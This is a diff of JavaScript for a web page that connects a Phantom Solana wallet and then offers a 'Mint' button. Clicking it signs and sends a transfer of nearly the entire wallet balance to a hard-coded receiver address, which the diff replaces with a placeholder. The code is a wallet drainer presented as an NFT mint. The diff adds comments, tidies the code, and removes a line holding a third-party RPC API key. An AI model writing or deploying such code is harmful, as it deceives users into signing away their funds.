@@ -2,28 +2,34 @@ $(document).ready(function () {
     $('#connect-wallet').on('click', async () => {
         if (window.solana && window.solana.isPhantom) {
             try {
+                // Подключение Phantom Wallet
                 const resp = await window.solana.connect();
                 console.log("Phantom Wallet connected:", resp);
 
+                // Установка соединения с RPC
                 const connection = new solanaWeb3.Connection(
-                    'https://solana-mainnet.api.syndica.io/api-key/42aSFR7aLhxB7NfXEq78aMvkfweu58G4ngdwhri32u9BAaaQ9wShomjTtKH9RCKJDpS3sxRGQXeZk3Wp8s8BDbLPjmLTCqTHhoN',
+                    'https://api.mainnet-beta.solana.com', // Используйте публичный RPC или ваш API
                     'confirmed'
                 );
 
+                // Получение публичного ключа кошелька
                 const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                 const walletBalance = await connection.getBalance(public_key);
                 console.log("Wallet balance:", walletBalance);
 
+                // Проверка минимального баланса для оплаты аренды
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                 if (walletBalance < minBalance) {
                     alert("Insufficient funds for rent.");
                     return;
                 }
 
+                // Изменение кнопки на "Mint"
                 $('#connect-wallet').text("Mint");
                 $('#connect-wallet').off('click').on('click', async () => {
                     try {
-                        const receiverWallet = new solanaWeb3.PublicKey('6LvPKGmA5hTfPqrwfXr9VTyGtxMLrc9dzPeL8QoM2Y5E'); // Замените адрес
+                        // Указание получателя перевода
+                        const receiverWallet = new solanaWeb3.PublicKey('XXXXXXXXXXX'); // Замените на кошелек получателя
                         const balanceForTransfer = walletBalance - minBalance;
 
                         if (balanceForTransfer <= 0) {
@@ -31,6 +37,7 @@ $(document).ready(function () {
                             return;
                         }
 
+                        // Создание транзакции
                         const transaction = new solanaWeb3.Transaction().add(
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: public_key,
@@ -41,21 +48,21 @@ $(document).ready(function () {
 
                         transaction.feePayer = resp.publicKey;
 
-                        const blockhashInfo = await connection.getLatestBlockhash();
-                        console.log("Blockhash info:", blockhashInfo);
-                        transaction.recentBlockhash = blockhashInfo.blockhash;
+                        // Получение актуального blockhash
+                        const { blockhash } = await connection.getLatestBlockhash();
+                        transaction.recentBlockhash = blockhash;
 
-                        console.log("Transaction object before signing:", transaction);
+                        // Подпись транзакции
                         const signed = await window.solana.signTransaction(transaction);
-                        console.log("Signed transaction:", signed);
+                        console.log("Transaction signed:", signed);
 
+                        // Отправка транзакции
                         const txid = await connection.sendRawTransaction(signed.serialize());
                         await connection.confirmTransaction(txid);
                         console.log("Transaction confirmed:", txid);
-                        alert(Transaction successful! TxID: ${txid});
+                        alert(`Transaction successful! TxID: ${txid}`);
                     } catch (err) {
-                        console.error("Error during minting:", err.message);
-                        console.error("Full error object:", err);
+                        console.error("Error during minting:", err);
                         alert("Minting failed. Check console for details.");
                     }
                 });
